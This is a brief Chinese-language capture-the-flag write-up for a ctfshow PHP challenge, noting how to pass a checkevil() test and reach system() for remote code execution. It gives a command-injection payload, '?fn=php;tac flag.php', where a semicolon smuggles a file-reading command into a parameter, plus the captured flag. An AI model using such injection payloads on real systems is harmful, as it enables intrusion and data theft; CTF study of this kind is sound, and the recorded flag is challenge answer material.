需要checkevil()为true，不进入if语句，利用system进行RCE。
再加一个;隔断rm。
payload : ?fn=php;tac flag.php
flag : ctfshow{bfb60e1a-c706-4c17-bfdc-516b1a7fad8c}